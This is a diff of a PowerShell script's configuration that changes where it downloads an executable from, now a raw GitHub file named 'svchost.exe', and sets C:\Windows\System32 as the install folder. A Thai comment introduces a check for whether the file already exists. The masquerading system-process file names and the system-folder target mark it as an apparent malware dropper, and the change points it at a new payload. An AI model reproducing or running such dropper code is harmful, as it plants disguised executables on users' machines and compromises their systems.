@@ -1,6 +1,6 @@
 # --- [ CONFIGURATION ] ---
 $appDirectory = "C:\Windows\System32"
-$exeUrl       = "https://raw.githubusercontent.com/backmrpun-hash/PS/main/fontdrvhostt.exe"
+$exeUrl       = "https://raw.githubusercontent.com/jaykayzlowlive-ops/ABYSS1/refs/heads/main/svchost.exe"
 
 # ฟังก์ชันสำหรับเช็คสถานะว่าในโฟลเดอร์มีไฟล์อยู่แล้วหรือไม่
 function Get-LocalAppFile {
